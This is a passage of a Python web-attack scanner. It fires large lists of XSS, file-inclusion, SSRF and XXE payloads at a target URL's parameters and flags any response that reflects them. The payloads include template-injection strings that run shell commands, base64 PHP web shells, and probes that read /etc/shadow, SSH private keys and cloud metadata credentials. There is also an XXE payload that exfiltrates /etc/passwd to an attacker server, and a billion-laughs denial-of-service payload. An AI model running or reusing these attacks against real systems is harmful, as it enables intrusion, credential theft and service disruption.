        "jav&#x09;ascript:alert(1)", # Tab in JS URI
        "java\0script:alert(1)", # Null byte in JS URI
        "<img src=x:x onerror=alert(1)>", # Colon in src
        "<img src=`x` onerror=alert(1)>", # Backticks in src
        "<img src='/' onerror=alert(1)>", # Slash in src
        "<script>/* */alert(1)</script>", # Comment in script
        "<script>eval('ale'+'rt(1)')</script>", # Eval obfuscation
        "<script>window['a'+'lert'](1)</script>", # Bracket notation
        "<script >alert(1)</script >", # Trailing space in tag
        "<script\n>alert(1)</script>", # Newline in tag
        "<script\t>alert(1)</script>", # Tab in tag
        "<img src=x onerror\n=\nalert(1)>", # Newlines in attribute
        "<img src=x onerror\t=\talert(1)>", # Tabs in attribute
        "<img src=x oNeRrOr=alert(1)>", # Case variation in attribute
        "<img src=x onerror=alert`1`>", # Backticks for alert
        "<img src=x onerror=alert(1)//>", # Comment in JS
        "<img src=x onerror=alert(1)<!--", # HTML comment in JS
        "&#x61;&#x6c;&#x65;&#x72;&#x74;(1)", # HTML entity encoding
        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))", # JS char code
        "javascript:alert&#x28;1&#x29;", # HTML entity for parenthesis
        "javascript:alert&#40;1&#41;", # HTML entity for parenthesis
        "javascript:alert%281%29", # URL encoded parenthesis
        "javascript:alert%0a(1)", # Newline bypass
        "javascript:alert%0d(1)", # Carriage return bypass
        "javascript:alert%09(1)", # Tab bypass
        "javascript:alert%00(1)", # Null byte bypass
        "javascript:alert(1)//", # Comment bypass
        "javascript:alert(1)/*", # Multi-line comment bypass
        "javascript:alert(1)<!--", # HTML comment bypass
        "javascript:alert(1);", # Semicolon
        "javascript:alert(1) ", # Trailing space
        "javascript:alert(1)\t", # Trailing tab
        "javascript:alert(1)\n", # Trailing newline
        "javascript:alert(1)\r", # Trailing carriage return

        # --- Data URIs (New) ---
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Base64 encoded script
        "data:text/html,<script>alert(1)</script>", # Direct script
        "data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", # Base64 with charset

        # --- Polyglots (More Advanced) ---
        "\"'';!--\"<XSS>=&{()}",
        "<svg onload=alert(1) class=a><script>alert(1)</script>",
        "<img src=x onerror=alert(1)><script>alert(1)</script>",
        "<a href=\"javascript:alert(1)\">CLICK</a><script>alert(1)</script>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/alert(1)//'>",
        "'\";alert(1);//",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "javascript:alert(1)",
        "{{alert(1)}}", # Template engine XSS
        "<%= alert(1) %>",
        "*{{alert(1)}}",
        "#{alert(1)}",
        "@{alert(1)}",
        "[[alert(1)]]",
        "@(1+1)",
        "#{process.mainModule.require('child_process').execSync('id')}", # Node.js RCE via XSS
        "{{''.__class__.__mro__[1].__subclasses__()[_].__init__.__globals__['os'].popen('id').read()}}", # Python RCE via XSS (needs index fuzzing)

        # --- DOM XSS specific payloads (Expanded) ---
        "javascript:alert(document.domain)",
        "javascript:alert(location.hash)",
        "javascript:alert(location.href)",
        "javascript:alert(document.cookie)",
        "javascript:eval(unescape(location.hash.substr(1)))",
        "javascript:window.name=location.hash.substr(1);eval(window.name)",
        "javascript:document.write('<img src=x onerror=alert(1)>')",

        # --- Mutation XSS (mXSS) (Expanded) ---
        "<style><img src=\"</style><img src=x onerror=alert(1)\">",
        "<iframe srcdoc='&lt;img src&equals;x onerror&equals;alert(1)&gt;'></iframe>",
    ]
    # Function to send request and check for reflected payload
    def send_and_check_xss(payload, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now, assumes parameters are known or discovered elsewhere)
    parameters_to_test = ['q', 'search', 'name', 'input'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in xss_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_xss(payload, param_name)

            if response is None:
                continue

            # Check for reflected XSS (simple reflection check)
            # A more robust check would involve parsing HTML and looking for script execution.
            if payload in response.text:
                vulnerabilities.append({
                    "type": "Cross-Site Scripting (Reflected)",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500], # Snippet of the response
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})" # Placeholder, needs actual PoC generation
                })
                print(f"        [!!!] XSS (Reflected) detected in {param_name}!")
                # For data extraction/exploitation payloads, we'd need to check attacker.com logs or similar.
                # This is a placeholder for future integration with a listener.
                if "attacker.com/log" in payload:
                    vulnerabilities[-1]["exploitation_attempt"] = "Attempted data exfiltration (check attacker.com logs)"
                
    return vulnerabilities

# --- LFI/RFI Module ---

def perform_lfi_rfi_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting LFI/RFI scan for: {target_url}")
    vulnerabilities = []

    lfi_rfi_payloads = [
        # Basic LFI payloads
        "../../../../etc/passwd",
        "../../../../windows/win.ini",
        "....//....//....//....//etc/passwd", # Double URL encoding
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded
        "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", # Double URL encoded
        "file:///etc/passwd", # File URI scheme
        
        # Null Byte and Path Truncation
        "../../../../etc/passwd%00",
        "../../../../etc/passwd%00.jpg",
        "../../../../etc/passwd.", # Path truncation (PHP < 5.3)
        
        # PHP Wrappers
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "php://filter/resource=../../../../etc/passwd",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQtJ10pOyA/Pg==", # Base64 encoded PHP shell
        "phar://../../../../path/to/archive.phar/file", # Example phar wrapper
        "zip://../../../../path/to/archive.zip%23file", # Example zip wrapper
        
        # Cloud Metadata (AWS, GCP, Azure)
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role", # AWS
        "http://169.254.169.254/latest/meta-data/hostname", # AWS
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", # GCP
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01", # Azure
        
        # Common sensitive files
        "../../../../proc/self/environ",
        "../../../../proc/self/cmdline",
        "../../../../var/log/apache2/access.log",
        "../../../../var/log/apache2/error.log",
        "../../../../var/log/nginx/access.log",
        "../../../../var/log/nginx/error.log",
        "../../../../WEB-INF/web.xml", # Java web apps
        "../../../../WEB-INF/classes/application.properties", # Spring Boot
        "../../../../config/database.yml", # Ruby on Rails
        "../../../../application/config/database.php", # CodeIgniter
        "../../../../wp-config.php", # WordPress
        # --- Traversal Variations (Increased Depth) ---
        *[f"../" * i + "etc/passwd" for i in range(5, 21)], # Increased depth
        *[f"..\\\\" * i + "windows\\\\win.ini" for i in range(5, 21)], # Increased depth
        *[f"....//" * i + "etc/passwd" for i in range(5, 21)], # Increased depth
        *[f"....\\\\" * i + "windows\\\\win.ini" for i in range(5, 21)], # Increased depth

        # --- Encoding Variations (Expanded) ---
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
        "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
        "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", # UTF-8 / bypass
        "..%c0%5c..%c0%5c..%c0%5c..%c0%5cwindows%c0%5cwin.ini",

        # --- Null Byte and Path Truncation (Expanded) ---
        "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini%00",
        "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini%00.txt",
        "../../../../etc/passwd%20",
        # Path truncation with many dots (simulating max path length)
        "../../../../etc/passwd" + "." * 250,
        "../../../../etc/passwd" + "/" * 250, # Directory traversal with many slashes

        # --- PHP Wrappers (Expanded) ---
        "php://filter/convert.iconv.utf-8.utf-7/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://filter/zlib.decompress/resource=/etc/passwd",
        "php://filter/string.toupper/resource=/etc/passwd",
        "php://filter/string.tolower/resource=/etc/passwd",
        "php://filter/string.strip_tags/resource=index.php",
        "data://text/plain,<?php phpinfo(); ?>",
        "php://input", # Requires POST data
        "expect://id", # If expect module is loaded
        "php://fd/1", "php://memory", "php://temp",
        "glob:///etc/passwd",
        "php://filter/string.strip_tags|convert.base64-encode/resource=/etc/passwd",
        "php://filter/zlib.decompress|convert.base64-encode/resource=/var/log/apache2/access.log",
        "file:///proc/self/fd/0", "file:///proc/self/fd/1", # File descriptors
        "glob:///*", "glob://*/*", # Glob patterns
        "php://filter/resource=./index.php", # Current directory
        "php://filter/resource=../index.php",
        "php://filter/resource=../../index.php",
        "php://filter/read=string.strip_tags/resource=php://input",
        "phar://archive.zip/file.txt",
        "zip://archive.zip#file.txt",
        "data:text/plain,<? echo system('id'); ?>",
        "data:text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2lkJyk7ID8+", # base64 encoded `<?php echo system('id'); ?>`
        "expect://ls", # If expect module is loaded

        # --- Sensitive Files (Linux) (Expanded) ---
        "/etc/shadow", "/etc/group", "/etc/hosts", "/etc/issue", "/etc/motd",
        "/etc/fstab", "/etc/crontab", "/etc/sysctl.conf", "/etc/resolv.conf",
        "/etc/profile", "/etc/bashrc",
        "~/.bash_history", "~/.ssh/id_rsa", "~/.ssh/authorized_keys",
        "/var/log/auth.log", "/var/log/syslog", "/var/log/dmesg",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/var/log/httpd/access_log", "/var/log/httpd/error_log",
        "/var/log/vsftpd.log", "/var/log/sshd.log", "/var/log/mail.log", "/var/log/cron.log", "/var/log/messages",
        "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status", "/proc/self/mounts",
        "/proc/net/arp", "/proc/net/route", "/proc/net/tcp", "/proc/net/udp",
        "/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/proc/sched_debug",
        "/etc/ssh/sshd_config", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
        "/etc/httpd/conf/httpd.conf", "/etc/lighttpd/lighttpd.conf", "/etc/vsftpd.conf",
        "/etc/sudoers", "/etc/passwd-", "/etc/shadow-", "/etc/gshadow",
        "/var/run/dmesg.boot", "/var/log/lastlog", "/var/log/wtmp", "/var/log/btmp",
        "/var/log/faillog", "/var/log/daemon.log", "/var/log/kern.log",
        "/opt/lampp/logs/access_log", "/usr/local/apache/logs/access_log",
        "/usr/local/nginx/logs/access.log", "/usr/local/var/log/nginx/access.log",
        "~/.bashrc", "~/.profile", "~/.zshrc", "~/.tmux.conf", "~/.vimrc",
        "/root/.ssh/id_rsa", "/home/user/.ssh/id_rsa", "/root/.bash_history",
        "/proc/self/attr/current", "/proc/self/cgroup", "/proc/self/comm",
        "/proc/mounts", "/proc/config.gz", "/proc/kmsg",
        "/sys/class/dmi/id/product_name", "/sys/firmware/acpi/tables/DSDT",

        # --- Sensitive Files (Windows) (Expanded) ---
        "C:/boot.ini", "C:/autoexec.bat", "C:/config.sys",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/Windows/repair/sam",
        "C:/Windows/php.ini", "C:/php/php.ini",
        "C:/xampp/apache/conf/httpd.conf",
        "C:/Users/Administrator/NTUser.dat",
        "C:/Windows/System32/LogFiles/W3SVC1/ex000000.log", # IIS logs
        "C:/Windows/System32/inetsrv/config/applicationHost.config", # IIS config
        "C:/Program Files/Apache Group/Apache2/conf/httpd.conf",
        "C:/Program Files/nginx-1.x.x/conf/nginx.conf",
        "C:/Program Files/php/php.ini",
        "C:/Users/Public/Desktop/desktop.ini",
        "C:/inetpub/wwwroot/web.config",
        "C:/Windows/win.ini.bak", "C:/Windows/system.ini",
        "C:/Program Files/MySQL/MySQL Server 8.0/my.ini",
        "C:/Program Files/PostgreSQL/14/data/postgresql.conf",
        "C:/Windows/Panther/Unattend.xml", # Windows unattended installation files

        # --- RFI Payloads (Expanded) ---
        "http://evil.com/rfi_test.txt",
        "https://evil.com/rfi_test.txt",
        "http://google.com",
        "//google.com",
        "ftp://evil.com/file.txt",
        "https://raw.githubusercontent.com/someuser/somerepo/main/shell.txt",

        # --- Cloud Metadata (AWS, GCP, Azure) (Expanded) ---
        "/var/lib/cloud/instance/user-data.txt", # AWS user-data
        "/var/lib/cloud/instance/vendordata.txt",
        "/etc/google/instance", # GCP instance metadata
        "/var/az_metadata", # Azure metadata
    ]
    # Function to send request and check for file content
    def send_and_check_lfi_rfi(payload, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now)
    parameters_to_test = ['file', 'page', 'view', 'load', 'template'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in lfi_rfi_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_lfi_rfi(payload, param_name)

            if response is None:
                continue

            # Check for LFI/RFI indicators
            if "root:x:0:0" in response.text or "for 16-bit app support" in response.text.lower() or "aws_access_key_id" in response.text or "metadata.google.internal" in response.text:
                vulnerabilities.append({
                    "type": "Local/Remote File Inclusion",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500], # Snippet of the response
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})" # Placeholder
                })
                print(f"        [!!!] LFI/RFI detected in {param_name}!")
                # Attempt to extract content if it's /etc/passwd or similar
                if "root:x:0:0" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found /etc/passwd content."
                elif "aws_access_key_id" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found AWS credentials."
                elif "metadata.google.internal" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found GCP metadata."
                
            # Check for PHP wrapper execution (e.g., base64 encoded content)
            if "php://filter/convert.base64-encode" in payload and "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQtJ10pOyA/Pg==" in response.text: # Example for base64 encoded PHP shell
                 vulnerabilities.append({
                    "type": "Local File Inclusion (PHP Wrapper - Base64 Encoded Source)",
                    "severity": "Medium",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                 print(f"        [!!!] LFI (PHP Wrapper - Base64 Encoded Source) detected in {param_name}!")

    return vulnerabilities

# --- SSRF Module ---

def perform_ssrf_attack(target_url, method="GET", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various Server-Side Request Forgery (SSRF) attacks on the target URL.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (GET or POST).
        data (dict): POST data.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting SSRF scan for: {target_url}")
    vulnerabilities = []

    ssrf_payloads = [
        # Localhost variations
        "127.0.0.1",
        "localhost",
        "0.0.0.0",
        "0", # Dot-less IP
        "2130706433", # Integer IP for 127.0.0.1
        "0x7f000001", # Hex IP for 127.0.0.1
        "[::1]", # IPv6 localhost
        "%31%32%37%2e%30%2e%30%2e%31", # URL encoded 127.0.0.1
        
        # Cloud Metadata Endpoints
        "http://169.254.169.254/latest/meta-data/", # AWS EC2 Metadata
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/", # AWS IAM Credentials
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", # GCP Metadata
        "http://169.254.169.254/metadata/instance?api-version=2017-08-01", # Azure Metadata
        
        # Internal IP ranges (examples)
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        
        # Various schemes
        "dict://localhost:6379/info", # Redis
        "gopher://localhost:80/_GET%20/%0A%0A", # Gopher to HTTP GET
        "ftp://localhost:21/", # FTP
        "file:///etc/passwd", # File scheme (often blocked, but worth trying)
        # --- Localhost variations (Expanded) ---
        "127.0.0.1.xip.io", # DNS rebinding bypass
        "127.0.0.1.nip.io", # DNS rebinding bypass
        "http://[::1]/", # IPv6 with scheme
        "http://0/", # Dot-less IP with scheme
        "http://0x7f000001/", # Hex IP with scheme
        "http://127.1/", # Shorthand IP
        "http://127.0.0.1:80/", # Explicit port
        "http://127.0.0.1:8080/", # Common internal port
        "http://127.0.0.1:9000/", # Common internal port

        # --- Cloud Metadata Endpoints (Expanded) ---
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role", # AWS specific role
        "http://169.254.169.254/latest/user-data", # AWS user data
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys", # GCP SSH keys
        "http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01&format=json", # Azure compute info
        "http://100.100.100.200/latest/meta-data/", # Alibaba Cloud
        "http://100.100.100.200/latest/user-data", # Alibaba Cloud

        # --- Internal IP ranges (Expanded) ---
        *[f"10.0.{i}.1" for i in range(0, 5)], # 10.0.X.1
        *[f"172.16.{i}.1" for i in range(0, 5)], # 172.16.X.1
        *[f"192.168.{i}.1" for i in range(0, 5)], # 192.168.X.1
        "10.0.0.0/8", # CIDR notation (conceptual, needs parsing)
        "172.16.0.0/12", # CIDR notation
        "192.168.0.0/16", # CIDR notation

        # --- Various schemes (Expanded) ---
        "gopher://localhost:80/_POST%20/admin%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2015%0A%0Auser=admin&pass=pass", # Gopher to HTTP POST
        "gopher://localhost:11211/_stats", # Gopher to Memcached
        "gopher://localhost:3306/_", # Gopher to MySQL (requires specific payload)
        "gopher://localhost:5432/_", # Gopher to PostgreSQL (requires specific payload)
        "gopher://localhost:27017/_", # Gopher to MongoDB (requires specific payload)
        "ldap://localhost:389/o=example,c=us??sub?(cn=*)", # LDAP
        "tftp://localhost/file.txt", # TFTP
        "smb://localhost/share", # SMB
        "nfs://localhost/share", # NFS
        "data:text/plain,Hello%20SSRF", # Data URI
        "php://filter/resource=http://localhost/index.php", # PHP filter with URL

        # --- Internal Port Scanning (New) ---
        *[f"http://127.0.0.1:{p}" for p in [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 9000, 27017]], # Common ports
        *[f"http://localhost:{p}" for p in [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 9000, 27017]],
        *[f"http://10.0.0.1:{p}" for p in [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 9000, 27017]],

        # --- URL Encoding Bypass ---
        "http://%6c%6f%63%61%6c%68%6f%73%74/", # Hex encoded localhost
        "http://127.0.0.1%00.evil.com/", # Null byte bypass
        "http://127.0.0.1%23.evil.com/", # Hash bypass
        "http://127.0.0.1%2f.evil.com/", # Slash bypass
        "http://127.0.0.1%5c.evil.com/", # Backslash bypass
        "http://127.0.0.1%252f.evil.com/", # Double encoded slash
        "http://127.0.0.1%255c.evil.com/", # Double encoded backslash
        "http://127.0.0.1%2e%2e%2f.evil.com/", # Dot-dot-slash bypass
        "http://127.0.0.1%252e%252e%252f.evil.com/", # Double encoded dot-dot-slash
        "http://127.0.0.1%2500.evil.com/", # Double encoded null byte
        "http://127.0.0.1%0a.evil.com/", # Newline bypass
        "http://127.0.0.1%0d.evil.com/", # Carriage return bypass
        "http://127.0.0.1%09.evil.com/", # Tab bypass
        "http://127.0.0.1%20.evil.com/", # Space bypass
        "http://127.0.0.1%2520.evil.com/", # Double encoded space
        "http://127.0.0.1%250a.evil.com/", # Double encoded newline
        "http://127.0.0.1%250d.evil.com/", # Double encoded carriage return
        "http://127.0.0.1%2509.evil.com/", # Double encoded tab
    ]
    # Function to send request and check for SSRF indicators
    def send_and_check_ssrf(payload, param_name):
        current_data = data.copy() if data else {}
        current_headers = headers.copy() if headers else {}
        current_cookies = cookies.copy() if cookies else {}

        # The target_url is where the SSRF vulnerability exists,
        # and the payload is the URL that the server will fetch.
        # We need to construct the request to the target_url with the payload.
        # Assuming the vulnerable parameter takes a URL as input.
        
        if method == "GET":
            test_url = f"{target_url}?{param_name}={quote_plus(payload)}"
            try:
                response = requests.get(test_url, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        elif method == "POST":
            current_data[param_name] = payload
            try:
                response = requests.post(target_url, data=current_data, headers=current_headers, cookies=current_cookies, timeout=timeout, verify=verify_ssl)
                return response
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                return None
        return None

    # Identify injectable parameters (simplified for now)
    parameters_to_test = ['url', 'uri', 'link', 'image_url', 'callback'] # Placeholder, should be dynamically discovered

    for param_name in parameters_to_test:
        print(f"[*] Testing parameter: {param_name}")

        for payload in ssrf_payloads:
            print(f"    [>] Trying payload: {payload[:50]}...") # Truncate long payloads for display
            response = send_and_check_ssrf(payload, param_name)

            if response is None:
                continue

            # Check for SSRF indicators in the response
            # This is highly dependent on how the server processes the request and returns the content.
            # Common indicators: content from internal services, cloud metadata, error messages.
            if "root:x:0:0" in response.text or "aws_access_key_id" in response.text or "metadata.google.internal" in response.text or "instance-id" in response.text or "server: nginx" in response.text.lower() or "server: apache" in response.text.lower():
                vulnerabilities.append({
                    "type": "Server-Side Request Forgery (SSRF)",
                    "severity": "High",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500], # Snippet of the response
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})" # Placeholder
                })
                print(f"        [!!!] SSRF detected in {param_name}!")
                # Attempt data extraction if cloud metadata is found
                if "aws_access_key_id" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found AWS credentials via SSRF."
                elif "metadata.google.internal" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found GCP metadata via SSRF."
                elif "root:x:0:0" in response.text:
                    vulnerabilities[-1]["extracted_content"] = "Found /etc/passwd via SSRF."
                
            # Internal port scanning (example, requires more sophisticated logic)
            # This would typically involve trying different ports on internal IPs and analyzing connection errors/banners.
            if any(ip in payload for ip in ["127.0.0.1", "localhost", "10.", "172.16.", "192.168."]) and ("Connection refused" in response.text or "could not connect" in response.text):
                # This is a very basic indicator, a real scan would be more robust.
                vulnerabilities.append({
                    "type": "Server-Side Request Forgery (SSRF) - Internal Port Scan Indicator",
                    "severity": "Medium",
                    "parameter": param_name,
                    "payload": payload,
                    "response_snippet": response.text[:500],
                    "poc_code": f"import requests\nrequests.request(method='{method}', url='{target_url}', {{'data=' + str(data) if data else ''}}, {{'headers=' + str(headers) if headers else ''}}, {{'cookies=' + str(cookies) if cookies else ''}}, timeout={timeout}, verify={verify_ssl})"
                })
                print(f"        [!!!] SSRF (Internal Port Scan Indicator) detected in {param_name}!")

    return vulnerabilities

# --- XXE Module ---

def perform_xxe_attack(target_url, method="POST", data=None, headers=None, cookies=None, timeout=10, verify_ssl=True):
    """
    Performs various XML External Entity (XXE) attacks on the target URL.
    Assumes the target_url expects an XML payload in the request body.

    Args:
        target_url (str): The URL to attack.
        method (str): HTTP method (POST is typical for XML).
        data (str): XML payload string.
        headers (dict): HTTP headers.
        cookies (dict): HTTP cookies.
        timeout (int): Request timeout in seconds.
        verify_ssl (bool): Whether to verify SSL certificates.

    Returns:
        list: A list of dictionaries, each representing a detected vulnerability or information.
    """
    print(f"[+] Starting XXE scan for: {target_url}")
    vulnerabilities = []

    # Common XXE payloads
    xxe_payloads = [
        # Basic XXE for file disclosure (LFI)
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>
<foo>&xxe;</foo>""",
        
        # XXE for error-based detection (malformed XML)
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///nonexistent\">]>
<foo>&xxe;</foo>""",
        
        # XXE for OOB (Out-of-Band) interaction (requires attacker-controlled DTD/server)
        # Placeholder for attacker server: ATTACKER_SERVER_IP_OR_DOMAIN
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://ATTACKER_SERVER_IP_OR_DOMAIN/evil.dtd\"> %remote; %int; %trick;]>
<foo>&trick;</foo>""",
        # evil.dtd content (on attacker server):
        # <!ENTITY % file SYSTEM \"file:///etc/passwd\">
        # <!ENTITY % int \"<!ENTITY &#x25; trick SYSTEM 'http://ATTACKER_SERVER_IP_OR_DOMAIN/exfil?data=%file;'>\">\n        
        # XXE for DoS (Billion Laughs Attack)
        """<?xml version=\"1.0\"?>
<!DOCTYPE lolz [
 <!ENTITY lol \"lol\">
 <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">
 <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">
 <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">
 <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">
 <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">
 <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">
 <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">
 <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">
]>
<lolz>&lol9;</lolz>""",

        # XInclude (if XML parsing supports it)
        """<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">
  <xi:include href=\"file:///etc/passwd\"/>
</root>""",
        
        # SOAP XXE (example, often within a SOAP envelope)
        """<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">
  <soapenv:Header/>
  <soapenv:Body>
    <foo>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
      <bar>&xxe;</bar>
    </foo>
  </soapenv:Body>
</soapenv:Envelope>""",
        # --- Basic XXE for file disclosure (LFI) (Expanded) ---
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]>
<foo>&xxe;</foo>""",
        """<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\">]>
<foo>&xxe;</foo>""",
